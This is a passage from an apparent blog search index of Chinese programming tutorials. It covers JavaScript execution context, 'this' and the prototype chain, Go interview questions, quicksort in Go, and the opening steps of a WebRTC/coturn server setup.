本来要销毁上下文的max,  但是 bar 函数却引用了这个max, 因此这个max不能被销毁，销毁了bar函数中的max就找不到值了。所以fn()上下文环境保留.  fn —> max = 10\n+ var max = 100;    global —> f1 = fn(), max = 100\n+ f1(15)  进入fn执行上下文环境, max 是10,  x 是15, 输出15\n+ 执行完毕进入全局上下文环境\n","tags":["javascript"],"categories":["javascript"]},{"title":"javascript执行上下文的准备工作","url":"%2Fp%2Fcfbcfff.html","content":"\n\n\n### 全局上下文的准备工作:\n\n全局环境下 javascript真正运行语句之前, 解释器会做一些准备工作:\n\n- 对变量的声明 (而变量的赋值, 是真正运行到那一行的时候才进行的.)\n- 对全局变量 this 的赋值\n- 对函数声明赋值, 对函数表达式声明\n\n\n\n如何理解这三种情况呢?\n\n1. 对变量的声明:\n\n```javascript\nconsole.log(a); // undefined\nvar a = 10;\n```\n\n准备工作是提前声明了变量 a, 和下面写法意思一样\n\n```javascript\nvar a; \nconsole.log(a); // undefined\na = 10;\n```\n\n<!-- more -->\n\n2. 对全局变量 this 的赋值:\n\n```javascript\nconsole.log(this) // window\n```\n\n执行前的准备工作是:  this 赋值为全局的 window 对象\n\n\n\n3. 对函数声明赋值, 对函数表达式声明:\n\n```javascript\nconsole.log(f1);// function f1() {}\nfunction f1() {} //这个是函数声明\n\nconsole.log(f2);  // undefined\nvar f2 = function(){}; //这个是函数表达式\n```\n\n执行前的准备工作是:  函数声明 f1 被赋值, 函数表达式 f2 被声明\n\n\n\n### 函数上下文额外的准备工作:\n\n1. 函数定义时, 额外的准备工作:\n\n- 记录函数内自由变量的作用域.  (自由变量就是引用外部作用域的变量)\n\n```javascript\nvar a = 10;\nfunction fn (){\n    console.log(a); // a是自由变量,此处定义时就记录了a要取值的作用域,即全局作用域\n}\n\nfunction bar(f){\n    var a = 20;\n    f(); // 输出10, 而不是20, 因为fn函数内自由变量 a 的作用域早被记录下来了,是外面的10\n}\nbar(fn)\n```\n\n\n\n2. 函数调用时, 额外的准备工作:\n\n- arguments 变量的赋值\n- 函数参数的赋值\n\n```javascript\nfunction fn(x){\n    console.log(arguments); // [10]\n    console.log(x); // 10\n}\nfn(10);\n```\n\n\n\n### 来看一道题:\n\n```javascript\nvar a = 'global';\nvar f = function(){\n    console.log(a); // 答案是undefined, 想想为什么\n    var a = 'local';\n}\nf();\n```\n\n","tags":["javascript"],"categories":["javascript"]},{"title":"javascript的this究竟指什么","url":"%2Fp%2Fd14f4ebd.html","content":"\n\n\n在学习 javascript 的 this之前, 我们需要先明确一个重要知识:\n\n> 在函数中this到底取何值，是在函数真正被调用执行的时候确定的，函数定义的时候确定不了。\n>\n> 简单记忆是，谁调用的函数，this就指向谁.\n\n\n\n在 javascript 中, this的取值，一般分为下面几种情况。\n\n### 一.  构造函数\n\n+ new 出的对象:\n\n```javascript\nfunction Foo(){\n  this.name = \"levon\";\n  this.age = 26;\n  console.log(this); // 当前构造的对象\n}\n\nvar f1 = new Foo();\n```\n\n\n\n+ 直接运行函数(普通函数使用):\n\n```javascript\nfunction Foo(){\n  this.name = \"levon\";\n  this.age = 26;\n  console.log(this); // 直接调用注意此处是 window\n}\n\nFoo();// window.Foo();\n```\n\n<!-- more -->\n\n### 二.  函数作为对象的属性\n\n+ 对象调用本身的函数:\n\n```javascript\nvar obj = {\n    x : 10,\n    fn : function(){\n        console.log(this);  // 此处就是 obj\n        console.log(this.x);//10\n    }\n}\n\nobj.fn();\n```\n\n\n\n+ 如果不用对象去调用:\n\n```javascript\nvar obj = {\n    x : 10,\n    fn : function(){\n        console.log(this);  // window\n        console.log(this.x);// undefined\n    }\n}\n\nvar fn1 = obj.fn;\nfn1();//window.fn1();\n\n```\n\n\n\n+ 需要注意的一种情况是下面的 f()函数, 此时 f()只是一个普通函数\n\n```javascript\nvar obj = {\n\tx : 10,\n\tfn : function(){\n\t\t\n        this;// 此处是 obj\n        \n\t\tfunction f(){\n\t\t\tconsole.log(this); // window\n\t\t\tconsole.log(this.x);// undefined\n\t\t}\n\t\tf();\n        \n\t}\n}\n\nobj.fn();\n```\n\n  \n\n### 三: 函数用 call 或 apply 调用\n\n+ 函数调用 call\n\n```javascript\nvar obj = {\n    x : 10\n};\n\nvar fn = function(){\n    console.log(this);  //函数调用call, this指向call中的参数, 就是obj\n    console.log(this.x);// 10\n}\n\nfn.call(obj)\n```\n\n\n\n### 四:  全局环境下的 this\n\n```javascript\nconsole.log(this); // window\n\n\nvar x = 10; //--> window.x = 10\nvar fn = function(){\n    console.log(this); //window\n    console.log(this.x)//10\n}\nfn();// window.fn();\n```\n\n\n\n### 五: 原型链中的 this\n\n```javascript\nfunction Fn(){\n    this.name = \"levon\";\n}\n\nFn.prototype.getName = function(){\n    console.log(this.name); //此处 this 是调用的当前对象 f1\n}\n\nvar f1 = new Fn();\nf1.getName(); //levon\n```\n\n\n\n其实不仅仅是构造函数的prototype，即便是在整个原型链中，this代表的也都是当前对象的值。","tags":["javascript"],"categories":["javascript"]},{"title":"golang常问的知识点","url":"%2Fp%2F19ae52d4.html","content":"\n\n\n# 1. channel\n\n### 1.1 关闭有缓冲数据的 channel, 还能读取吗\n\n只有当channel无数据，且channel被close了，才会返回ok=false。 只要有堆积数据，即使 close() 也不会返回关闭状态。\n\n关闭后有数据也能从里面得到数据，除非消耗空了。\n\n<!-- more -->\n\n```go\nfunc main() {\n\n\tc := make(chan int, 10)\n\tc <- 1\n\tc <- 2\n\tc <- 3\n\tclose(c)\n\n\tfor {\n\t\tdata, ok := <-c\n\t\tif !ok {\n\t\t\treturn\n\t\t}\n\t\tfmt.Println(data, ok)\n\t}\n}\n\n/*\n1 true\n2 true\n3 true\n*/\n```\n\n\n\n### 1.2 channel 被close后，还能被接收或 select 吗\n\n+ 如果有缓存，值能被收到，ok 是 true\n\n+ 如果无缓存，值是0，ok 是 false，但不会 panic\n+ 关闭后, 就是你可以读, 但是不能写\n\n\n\n### 1.3 如何判断channel已经关闭了 ？\n\n+ Go 中没有一个內建函数去检测管道是否已经被关闭.\n+ 直接读取channel结构hchan的closed字段, 不安全\n\n```go\nimport (\n    \"unsafe\"\n    \"reflect\"\n)\n\n\nfunc isChanClosed(ch interface{}) bool {\n    if reflect.TypeOf(ch).Kind() != reflect.Chan {\n        panic(\"only channels!\")\n    }\n\n    // get interface value pointer, from cgo_export \n    // typedef struct { void *t; void *v; } GoInterface;\n    // then get channel real pointer\n    cptr := *(*uintptr)(unsafe.Pointer(\n        unsafe.Pointer(uintptr(unsafe.Pointer(&ch)) + unsafe.Sizeof(uint(0))),\n    ))\n\n    // this function will return true if chan.closed > 0\n    // see hchan on https://github.com/golang/go/blob/master/src/runtime/chan.go \n    // type hchan struct {\n    // qcount   uint           // total data in the queue\n    // dataqsiz uint           // size of the circular queue\n    // buf      unsafe.Pointer // points to an array of dataqsiz elements\n    // elemsize uint16\n    // closed   uint32\n    // **\n\n    cptr += unsafe.Sizeof(uint(0))*2\n    cptr += unsafe.Sizeof(unsafe.Pointer(uintptr(0)))\n    cptr += unsafe.Sizeof(uint16(0))\n    return *(*uint32)(unsafe.Pointer(cptr)) > 0\n}\n```\n\n+ 正常做法是要监听 close()的 channel,  收到通知\n\n  如果您不知道通道是否关闭并且盲目地写入该通道，则说明您的程序设计不良。 重新设计它，使其在关闭后无法写入。\n\n+ 可用 bool值，但是会多读一个值\n\n  ```go\n  value, ok := <- channel \n  if !ok {    \n    // channel was closed and drained \n  }\n  ```\n\n\n\n\n### 1.4 channel 的零值\n\nchannel的零值是nil。也许会让你觉得比较奇怪，nil的channel有时候也是有一些用处的。\n\n+ 因为对一个nil的channel发送和接收操作会永远阻塞\n+ 在select语句中操作nil的channel永远都不会被select到。这使得我们可以用nil来激活或者禁用case。\n\n```go\nfunc main() {\n\n\tvar c chan int\n\tfmt.Println(c)\n\n\tfor {\n\t\tselect {\n\t\tcase <-c:\n\t\t\tfmt.Println(\"nerver\")\n\t\tdefault:\n\t\t}\n\t}\n}\n\n\n// 输出 nil 之后无线循环，不会输出 nerver\n```\n\n\n\n### 1.5 优雅的关闭 channel\n\nhttps://www.liuvv.com/p/8b210700.html\n\n\n\n### 1.6 什么时候用 channel， 什么时候用Mutex\n\nhttps://github.com/golang/go/wiki/MutexOrChannel\n\nchannel的能力是让数据流动起来，擅长的是数据流动的场景\n\n+ 传递数据的所有权，即把某个数据发送给其他协程\n\n+ 分发任务，每个任务都是一个数据\n\n+ 交流异步结果，结果是一个数据\n\nmutex的能力是数据不动，某段时间只给一个协程访问数据的权限擅长数据位置固定的场景\n\n+ 缓存\n\n+ 状态\n\n\n\n\n# 2. 数据结构\n\n### 2.1 map 为什么无序\n\n+ map扩容, key 会移动\n\n  map 在扩容后，会发生 key 的搬迁，原来落在同一个 bucket 中的 key，搬迁后，有些 key 就要远走高飞了（bucket 序号加上了 2^B）。而遍历的过程，就是按顺序遍历 bucket，同时按顺序遍历 bucket 中的 key。搬迁后，key 的位置发生了重大的变化，有些 key 飞上高枝，有些 key 则原地不动。这样，遍历 map 的结果就不可能按原来的顺序了。\n\n+ 底层代码随机值遍历\n\n  Go 做得更绝，当我们在遍历 map 时，并不是固定地从 0 号 bucket 开始遍历，每次都是从一个随机值序号的 bucket 开始遍历，并且是从这个 bucket 的一个随机序号的 cell 开始遍历。这样，即使你是一个写死的 map，仅仅只是遍历它，也不太可能会返回一个固定序列的 key/value 对了。\n\n\n\n### 2.2 map 的key 可以是什么类型\n\nmap中的key可以是任何的类型，只要它的值能比较是否相等. Go语言里是无法重载操作符的\n\n- 布尔值\n\n- 数字\n\n- 字符串\n\n- 指针\n\n  Pointer values are comparable. Two pointer values are equal if they point to the same variable or if both have value nil. Pointers to distinct zero-size variables may or may not be equal.\n\n  当指针指向同一变量，或同为nil时指针相等，但指针指向不同的零值时可能不相等。\n\n- Channel\n\n  Channel values are comparable. Two channel values are equal if they were created by the same call to make or if both have value nil.\n\n  Channel当指向同一个make创建的或同为nil时才相等。\n\n- Interface\n\n  Interface values are comparable. Two interface values are equal if they have identical dynamic types and equal dynamic values or if both have value nil.\n\n  当接口有相同的动态类型并且有相同的动态值，或者值为都为nil时相等。\n\n- 结构体\n\n  Struct values are comparable if all their fields are comparable. Two struct values are equal if their corresponding non-blank fields are equal.\n\n  结构体当所有字段的值相同，并且没有相应的非空白字段时，则他们相等。\n\n- 只包含上述类型的数组。\n\n  Array values are comparable if values of the array element type are comparable. Two array values are equal if their corresponding elements are equal.\n\n  两个数组只要他们包括的元素，每个元素的值相同，则他们相等。\n\n但不能是：\n\n- slice\n- map\n- function\n\n\n\n### 2.3 map 如何有序遍历\n\n+ map 默认是无序的，不管是按照 key 还是按照 value 默认都不排序。\n\n+ 有序遍历\n\n  如果你想为 map 排序，需要将 key（或者 value）拷贝到一个切片，再对切片排序（使用 sort 包），然后可以使用切片的 for-range 方法打印出所有的 key 和 value。\n\n\n\n\n### 2.4 slice 和 map 并发安全吗\n\nmap和slice都是并发不安全的, 解决方案:\n\n+ 加锁\n+ 使用 channel 串行化\n+ sync.Map\n\n\n\n### 2.5 slice 底层原理\n\n```go\ntype slice struct {\n\tarray unsafe.Pointer\n\tlen   int\n\tcap   int\n}\n```\n\n切片的结构体由3部分构成，Pointer 是指向一个数组的指针，len 代表当前切片的长度，cap 是当前切片的容量。cap 总是大于等于 len 的。\n\n- 如果切片的容量小于1024个元素，那么扩容的时候slice的cap就翻番，乘以2；一旦元素个数超过1024个元素，增长因子就变成1.25，即每次增加原来容量的四分之一。\n- 如果扩容之后，还没有触及原数组的容量，那么，切片中的指针指向的位置，就还是原数组，如果扩容之后，超过了原数组的容量，那么，Go就会开辟一块新的内存，把原来的值拷贝过来，这种情况丝毫不会影响到原数组。\n\n\n\n# 5. interface\n\n### 5.1 interface 当参数时的坑, 传递 nil 也不是 nil\n\n如果需要判断, 请用反射 `reflect.ValueOf(i).IsNil()`\n\n```go\npackage main\n\nimport \"fmt\"\n\ntype I interface {\n\tA() error\n}\n\ntype T struct {\n}\n\nfunc (t *T) A() error {\n\treturn nil\n}\n\nfunc testInterface(i I) {\n\tif i == nil {\n\t\tfmt.Println(\"i is nil\")\n\t} else {\n\t\tfmt.Println(\"i is not nil\")\n\t}\n}\nfunc main() {\n\tt := new(T)\n\tt = nil\n\ttestInterface(t) //i is not nil\n}\n\n```\n\n\n\n# 6. make\n\n### 6.1 make时传递的数字参数\n\n```go\npackage main\n\nimport \"fmt\"\n\nfunc main() {\n\ts := make([]int, 0)\n\tfmt.Println(s) //[]\n\ts = append(s, 1, 2, 3)\n\tfmt.Println(s) //[1 2 3]\n}\n\n```\n\n如果传递了个数, 就是有默认值了\n\n```go\npackage main\n\nimport \"fmt\"\n\nfunc main() {\n\ts := make([]int, 5)\n\tfmt.Println(s) //[0 0 0 0 0]\n\n  s = append(s, 1, 2, 3)\n\tfmt.Println(s) //[0 0 0 0 0 1 2 3]\n}\n```\n\n\n\n### 6.2 make 和 new的区别\n\n+ make 只能用于 slice,map,channel\n\n  返回的类型就是这三个类型本身，而不是他们的指针类型，因为这三种类型是引用类型。\n\n+ new(T) 返回 T 的指针 *T 并指向 T 的零值。\n\n\n\n# 7. 函数\n\n### 7.1 函数参数传递，是值还是引用\n\n​\tGo 中函数传参仅有值传递一种方式, 只有slice, map, channel 本身是引用类型, 所以可以改\n\n+ 其实传递的就是值,但是为什么能改内容呢?\n\n  ```go\n  func ChangeMap(value map[string]string) {\n    fmt.Printf(\"map内部 %p\\n\", &value)\n    value[\"age\"] = \"30\"\n  }\n  \n  func ChangeSlice(value []string) {\n    fmt.Printf(\"slice内部 %p\\n\", &value)\n    value[0] = \"haha\"\n  }\n  \n  func main() {\n    map1 := make(map[string]string)\n    map1[\"age\"] = \"21\"\n    fmt.Printf(\"map外部 %p\\n\", &map1)\n    fmt.Println(map1[\"age\"])\n    ChangeMap(map1)\n    fmt.Println(map1[\"age\"])\n  \n    slice1 := make([]string, 0)\n    slice1 = append(slice1, \"hehe\")\n    fmt.Println(slice1)\n    fmt.Printf(\"slice外部 %p\\n\", &slice1)\n    ChangeSlice(slice1)\n    fmt.Println(slice1)\n  }\n  \n  /*\n  map外部 0xc000092018\n  21\n  map内部 0xc000092028\n  30\n  \n  \n  [hehe]\n  slice外部 0xc00008a040\n  slice内部 0xc00008a080\n  [haha]\n  */\n  ```\n\n+ 普通的类型就是值传递\n\n  ```go\n  package main\n  \n  import \"fmt\"\n  \n  func main() {\n  \ta := 10\n  \tfmt.Printf(\"%#v\\n\", &a) // (*int)(0xc420018080)\n  \tvFoo(a)\n  }\n  \n  func vFoo(b int) {\n  \tfmt.Printf(\"%#v\\n\", &b) // (*int)(0xc420018090)\n  }\n  ```\n\n   \n\n\n# 8. 其他问题\n\n### 8.1 字节和字节对齐\n\n+ 字节数 \n\n  + 64位系统下, int 默认 int64 ,  8个字节, \n\n  + float 64,  8个字节\n\n```go\npackage main\n\nimport (\n\t\"fmt\"\n\t\"unsafe\"\n)\n\nfunc main() {\n\tvar a int\n\tfmt.Println(unsafe.Sizeof(a)) //8\n\n\tvar b int32\n\tfmt.Println(unsafe.Sizeof(b)) //4\n\n\tvar c int64\n\tfmt.Println(unsafe.Sizeof(c)) //8\n\n\tvar d float64\n\tfmt.Println(unsafe.Sizeof(d)) //8\n\n\tvar e float32\n\tfmt.Println(unsafe.Sizeof(e)) //4\n\n\tvar f string\n\tfmt.Println(unsafe.Sizeof(f)) //16\n\n\tvar g chan int\n\tfmt.Println(unsafe.Sizeof(g)) //8\n\n\tvar h []int\n\tfmt.Println(unsafe.Sizeof(h)) //24\n\n\tvar i map[int]int\n\tfmt.Println(unsafe.Sizeof(i)) //8\n}\n```\n\n+ 字节对齐(根据操作系统的位数对齐的)\n\n```go\npackage main\n\nimport (\n\t\"fmt\"\n\t\"unsafe\"\n)\n\ntype Info1 struct {\n\tsex    bool //1\n\tstatus int8 //1\n}\n\ntype Info2 struct {\n\tsex bool //1\n\tage int  //8\n}\n\ntype Info3 struct {\n\tsex bool  //1\n\tage int32 //4\n}\n\ntype Info4 struct {\n\tsex    bool //1\n\tage    int  //8\n\tstatus int8 //1\n}\n\ntype Info5 struct {\n\tsex    bool //1\n\tstatus int8 //1\n\tage    int  //8\n}\n\ntype Info6 struct {\n\ta bool   //1\n\tb string //16\n\tc bool   //1\n}\n\ntype Info7 struct {\n\ta bool   //1\n\tc bool   //1\n\tb string //16\n}\n\nfunc main() {\n\tfmt.Println(unsafe.Sizeof(Info1{})) //2\n\tfmt.Println(unsafe.Sizeof(Info2{})) //16(8+8)\n\tfmt.Println(unsafe.Sizeof(Info3{})) //8(4+4)\n\tfmt.Println(unsafe.Sizeof(Info4{})) //24(8+8+8)\n\tfmt.Println(unsafe.Sizeof(Info5{})) //16(1+1+8 = 8+8)\n\tfmt.Println(unsafe.Sizeof(Info6{})) //32(1+16+1 = 8+16+8)\n\tfmt.Println(unsafe.Sizeof(Info7{})) //16(1+1+16 = 8+16)\n}\n```\n\n\n\n### 8.2 非运行多态\n\ngo 语言中，当子类调用父类方法时，“作用域”将进入父类的作用域，看不见子类的方法存在\n\n```go\npackage main\n\nimport \"fmt\"\n\ntype A struct {\n}\n\nfunc (a *A) ShowA() {\n\tfmt.Println(\"showA\")\n\ta.ShowB()\n}\nfunc (a *A) ShowB() {\n\tfmt.Println(\"showB\")\n}\n\ntype B struct {\n\tA\n}\n\nfunc (b *B) ShowB() {\n\tfmt.Println(\"b showB\")\n}\n\nfunc main() {\n\tb := B{}\n\tb.ShowA()\n}\n\n// showA\n// showB,  not b showB\n```\n","tags":["golang"],"categories":["golang"]},{"title":"快速排序","url":"%2Fp%2Fff8068c0.html","content":"\n每次写快速排序，写过一次搞明白了，过一段时间写又忘记了。这次采用牛郎织女的故事，加深记忆。\n\n+ 牛郎织女从两边往中间走见面，但是他们身上是有任务的，他们选取路上的 一个数字作为交流信号。\n\n+ 牛郎先向左走，大于等于就走，**小于** 就停。织女向右走，小于等于就走，**大于** 就停，然后两人打电话交换脚下的数据。\n+ 接着走，接着打电话交换数据，直到两人相遇。相遇后，把两人脚下的数据和心中的数字做交换。\n\n+ 至此，相遇点左边都是比心中数字小，相遇点右边都是比心中数字大。\n\n<!-- more -->\n\n\n\n# 1. 快速排序\n\n### 1.1 原始数据 “**6 1 2 7 9 3 4 5 10 8**”，目标：左边小于参考值，右边大于参考值\n\n![1](快速排序/1.png)\n\n\n\n把第一个值 **6** 作为参考值，分别从初始序列“**6 1 2 7 9 3 4 5 10 8**”两端开始“探测”。先从**右**往**左**找一个小于 **6** 的数，再从**左**往**右**找一个大于 **6** 的数，然后交换他们。\n\n这里可以用两个变量 **i** 和 **j**，分别指向序列最左边和最右边。我们为这两个变量起个好听的名字“哨兵 i”和“哨兵 j”。刚开始的时候让哨兵 i 指向序列的最左边（即 **i=1**），指向数字 **6**。让哨兵 **j** 指向序列的最右边（即 **j=10**），指向数字 **8**。\n\n---\n\n![1](快速排序/2.png)\n\n首先哨兵 **j** 开始出动。因为此处设置的基准数是最左边的数，所以需要让哨兵 **j** 先出动，这一点非常重要（后面会解释）。哨兵 **j** 一步一步地向左挪动（即 **j--**），直到找到一个小于 **6** 的数停下来。接下来哨兵 **i** 再一步一步向右挪动（即 **i++**），直到找到一个数大于 **6** 的数停下来。最后哨兵 **j** 停在了数字 **5** 面前，哨兵 **i** 停在了数字 **7** 面前。\n\n现在交换哨兵 **i** 和哨兵 **j** 所指向的元素的值。交换之后的序列如下：6 1 2 **5** 9 3 4 **7** 10 8，到此，第一次交换结束。\n\n![1](快速排序/3.png)\n\n---\n\n\n\n接下来开始哨兵 **j** 继续向左挪动（再友情提醒，每次必须是哨兵 **j** 先出发）。他发现了 **4**（比基准数 **6** 要小，满足要求）之后停了下来。哨兵 **i** 也继续向右挪动的，他发现了 **9**（比基准数 **6** 要大，满足要求）之后停了下来。\n\n![1](快速排序/4.png)\n\n此时再次进行交换，交换之后的序列如下：6 1 2 5 **4** 3 **9** 7 10 8，第二次交换结束。\n\n![1](快速排序/5.png)\n\n\n\n---\n\n\n\n“探测”继续。哨兵 **j** 继续向左挪动，他发现了 **3**（比基准数 **6** 要小，满足要求）之后又停了下来。哨兵 **i** 继续向右移动，糟啦！此时哨兵 **i** 和哨兵 **j** 相遇了，哨兵 **i** 和哨兵 **j** 都走到 **3** 面前。说明此时“探测”结束。\n\n![1](快速排序/6.png)\n\n\n\n我们将基准数 **6** 和 **3** 进行交换。\n\n![1](快速排序/7.png)\n\n交换之后的序列如下：**3** 1 2 5 4 **6** 9 7 10 8。\n\n![1](快速排序/8.png)\n\n\n\n到此第一轮“探测”真正结束。此时以基准数 **6** 为分界点，**6** 左边的数都小于等于 **6**，**6** 右边的数都大于等于 **6**。回顾一下刚才的过程，其实哨兵 **j** 的使命就是要找小于基准数的数，而哨兵 **i** 的使命就是要找大于基准数的数，直到 **i** 和 **j** 碰头为止。\n\n---\n\nOK，解释完毕。现在基准数 **6** 已经归位，它正好处在序列的第 **6** 位。此时我们已经将原来的序列，以 **6** 为分界点拆分成了两个序列，左边的序列是“**3 1 2 5 4**”，右边的序列是“ **9 7 10 8** ”。\n\n接下来开始递归把。\n\n\n\n### 1.2 代码实现\n\n```go\npackage main\n\nimport \"fmt\"\n\nfunc main() {\n\tarr := []int{21, 2, 1, 60, 32}\n\tPrint(arr)//21      2       1       60      32\n\tQuickSort(arr, 0, len(arr)-1)\n\tPrint(arr)//1       2       21      32      60\n}\n\nfunc QuickSort(arr []int, left, right int) {\n\tif left < right {\n\t\tmid := partition(arr, left, right)\n\t\tQuickSort(arr, left, mid-1)\n\t\tQuickSort(arr, mid+1, right)\n\t}\n}\n\nfunc partition(arr []int, left, right int) int {\n\n\tvalue := arr[left] // 两人心中所想的数字\n\tstart := left      // 记录所想数字的位置，相遇了要交换\n\n\tfor left != right { // 两人不相遇，就循环\n\n\t\tfor left < right && arr[right] >= value { //牛郎先走，大于等于就走，小于就停\n\t\t\tright--\n\t\t}\n\t\tfor left < right && arr[left] <= value { //织女后走，小于等于就走，大于就停\n\t\t\tleft++\n\t\t}\n\n\t\tif left < right { //双方停止后打电话交换脚下的数据\n\t\t\tarr[left], arr[right] = arr[right], arr[left]\n\t\t}\n\t\t//接着循环，直到两人相遇\n\t}\n\n\t// 相遇了，把两人脚下数据和心中数字交换，下面 left 和 right 是相等的\n\tarr[start], arr[left] = arr[left], arr[start]\n\n\treturn left\n}\n\nfunc Print(arr []int) {\n\tfor _, v := range arr {\n\t\tfmt.Printf(\"%d\\t\", v)\n\t}\n\tfmt.Print(\"\\n\")\n}\n\n```\n\n\n\n\n\n# 2. 实现的问题\n\n### 2.1 为什么从右往左开始找\n\n如果哨兵 i 先走，相遇的地点有可能大于基准的值，跟基准一交换，大的值跑到前面去了，肯定是不对的。\n\n哨兵 j 的寻找条件是小于基准数的数，所以最终定位到的序列中间的数总是会小于基准数，交换后顺序是对的，这样就能保证快速排序正确执行。\n\n\n\n### 2.2 为什么大于等于，小于等于开始走，不是大于，小于\n\n如果就两个数，正确的结果是相遇交换，而不是打电话交换。\n\n+ 2，1\n  +  right 大于等于2不动，left 小于等于2走一步相遇\n+ 2，2\n  + right 大于等于2走一步，直接相遇\n\n+ 1，2\n  + right 大于等于1走一步，直接相遇\n\n\n\n### 2.3  另外一种方案\n\n只要有一个人停下，就打电话交换，这样交换的次数会多一些。\n\n```go\npackage main\n\nimport \"fmt\"\n\nfunc parition(a []int, left, right int) int {\n\n\tvalue := a[left]\n\n\tfor left != right {\n\t\tfor left < right && a[right] >= value {\n\t\t\tright--\n\t\t}\n\t\ta[left], a[right] = a[right], a[left]\n\n\t\tfor left < right && a[left] <= value {\n\t\t\tleft++\n\t\t}\n\t\ta[left], a[right] = a[right], a[left]\n\t}\n\n\treturn left\n}\n\nfunc QuickSort(a []int, left, right int) {\n\tif left >= right {\n\t\treturn\n\t}\n\tmid := parition(a, left, right)\n\tQuickSort(a, left, mid-1)\n\tQuickSort(a, mid+1, right)\n}\n\nfunc main() {\n\ta := []int{6, 1, 2, 7, 9, 3, 4, 5, 10, 8}\n\tfmt.Println(a)\n\tQuickSort(a, 0, len(a)-1)\n\tfmt.Println(a)\n}\n\n/*\n[6 1 2 7 9 3 4 5 10 8]\n[1 2 3 4 5 6 7 8 9 10]\n*/\n```\n\n\n\n# 3. 头脑风暴\n\n+ 记住牛郎织女, 先右再左\n+ 走的过程比较,要用 >= 或 <=\n+ 写两个函数, 一个分段函数, 一个递归函数, 递归的函数要有出口\n\n\n\n# 4. 参考资料\n\n+ https://wiki.jikexueyuan.com/project/easy-learn-algorithm/fast-sort.html\n\n+ https://blog.csdn.net/qq_43990023/article/details/102297065\n\n","tags":["算法"],"categories":["算法"]},{"title":"javascript原形链的自我理解","url":"%2Fp%2F6d00c950.html","content":"\n### Object 和 Function\n\n首先在 javascript 中 我们要明确Object 和 Function两个概念:\n\n+ 万物皆对象\n\n+ 所有对象都是函数创建出来\n\n仔细琢磨这两句话, 其实说的 Object 和 Function 是一个鸡生蛋还是蛋生鸡的问题. 为什么这么讲呢? 因为函数也是一个对象, 但对象又是函数创建出来的. \n\n 其实原形链的一切江湖恩怨都是围绕着Function和Object两大家族展开的.\n\n\n\n<!-- more -->\n\n### 鸡家族和蛋家族\n\n+ 有创造力的函数我们称为Function鸡家族, 没有创造力的对象我们称为Object蛋家族\n\n+ 芸芸众生,你我她都是一个蛋对象(~~). 我们都是被某一个函数创建出来, 我们可以称为创建我们的这个函数为鸡爸爸, 我们每人都有一个鸡爸爸\n\n+ 注意创建我们的鸡爸爸函数, 也是一个对象. 它曾经也是被某一个函数创建出来的\n\n\n\n### prototype鸡技能仓库\n\n+ prototype 是 Function鸡家族独有的技能仓库, 没有创造能力的蛋家族没有这个仓库.\n\n+ 鸡技能仓库内放着鸡爸爸的属性和函数等技能. 例如吃小米、捉虫子、变凤凰...\n\n+ 注意鸡技能仓库属于 Object蛋家族,  因为鸡技能仓库没有创造能力, 鸡才有创造力\n\n\n\nOK, 创建我们的鸡爸爸它拥有 prototype 属性.  意味着每个鸡都拥有一个技能仓库, 仓库的大门上也写着拥有者名字(constructor属性), 即这个鸡本人的名字\n\n+ prototype 是鸡的属性, 而constructor是鸡技能仓库的属性\n\n  \n\n###  \\__proto\\__ 拥有鸡爸爸技能仓库的钥匙\n\n\n\n+ \\__proto\\__ 是一个隐藏的指针, 万物皆有这个指针. 我们可以将这个 \\__proto\\__ 理解为 我拿着一把我鸡爸爸技能仓库的钥匙\n\n+ 我拿了一把鸡爸爸技能仓库钥匙, 意味着我可以使用鸡爸爸技能仓库的技能,  例如吃小米、捉虫子、变凤凰...\n\n\n\n那么鸡的 \\__proto\\__ 指向谁? 鸡技能仓库的  \\__proto\\__ 又指向谁?\n\n+ 创建鸡(函数家族)的鸡爸爸 是function Function(),  所以鸡的  \\__proto\\__ 指向 Function.prototype\n\n+ 创建鸡仓库(对象家族)的鸡爸爸是function  Object(), 所以鸡仓库的  \\__proto\\__ 指向 Object.prototype\n\n+ 最后 Object. \\__proto\\__指向了 null\n\n\n\nOK, 如果我调用一个函数, 那么先在我身上找这个函数. \n\n如果没找到, 就拿起我的钥匙去我鸡爸爸的技能仓库去找.\n\n如果还没找到, 就拿起技能仓库对象的钥匙, 去仓库对象鸡爸爸的技能仓库去找, 一直找到 null为止.\n\n\n\n### 分析一张图\n\n![img](javascript原形链的自我理解/1.png)\n\n\n\n上面部分:\n\n+ f1 = new Foo()  我是f1, 没有prototype仓库,  我的  \\__proto\\__ 指向了鸡爸爸的仓库 Foo.prototype\n+ 鸡爸爸(Function Foo)的技能仓库(prototype)是 Foo.prototype, 仓库的名字(constructor)是 function Foo()\n\n+ 鸡技能仓库Foo.prototype的 \\__proto\\__ 指向了 Object.prototype,  Object.prototype的  \\__proto\\__ 指向了 null (前面已经提过)\n\n左侧部分:\n\n+ function Foo的鸡爸爸是 function Function(), 因为是这个函数创建了鸡爸爸, 所以 Function Foo的 \\__proto\\__指向了 Function.prototype 仓库\n+ 再看function Function()  它的技能仓库是 Function.prototype, 技能仓库名字是 function Function() .  另外过分的是function Function() 是被它自己function Function()创建出来的, 所以它的 \\__proto\\__指向了自己的技能仓库\n\n中间部分: \n+ function Object的  \\__proto\\__  指向了Function.prototype 看来所有鸡的钥匙都指向了Function.prototype\n+ 技能仓库Function.prototype的 \\__proto\\__ 指向了 Object.prototype,  Object.prototype的  \\__proto\\__ 指向了 null \n\n\n\n### instanceof 寻仓库运算符\n\ninstanceof运算符的第一个变量是一个对象(蛋家族)，暂时称为A；第二个变量一般是一个函数(鸡家族)，暂时称为B。\n\nInstanceof的判断队则是：沿着A的 \\__proto\\__ 这条线来找，同时沿着B的prototype这条线来找，如果两条线能找到同一个引用，即同一个对象，那么就返回true。如果找到终点还未重合，则返回false。\n\n\n\n```javascript\nconsole.log(Object instanceof Function); //true\nconsole.log(Function instanceof Object); //true\nconsole.log(Function instanceof Function); //true\n```\n\n\n\n","tags":["javascript"],"categories":["javascript"]},{"title":"搭建webRTC视频聊天","url":"%2Fp%2F697b4dfa.html","content":"\n\n\n想在公网上实现视频通信，需要下面3个核心元素：\n\n1. 一个是NAT穿透服务器(ICE Server)，实现内网穿透。\n2. 基于WebSocket的信令服务器(Signaling Server)，用于建立点对点的通道。\n3. Web客户端。通过H5的WebRTC特性调用摄像头，进行用户交互。\n\n<!-- more -->\n\n## 1. 搭建NAT穿透服务器coturn\n\n+ 教程:\n\nhttps://github.com/coturn/coturn/wiki/README\n\n\n\n+ 准备工作: \n\n```shell\nsudo yum install gcc\nsudo yum install openssl-devel\nsudo yum install libevent\nsudo yum install libevent-devel\nsudo yum install sqlite\nsudo yum install sqlite-devel\n\n参见: 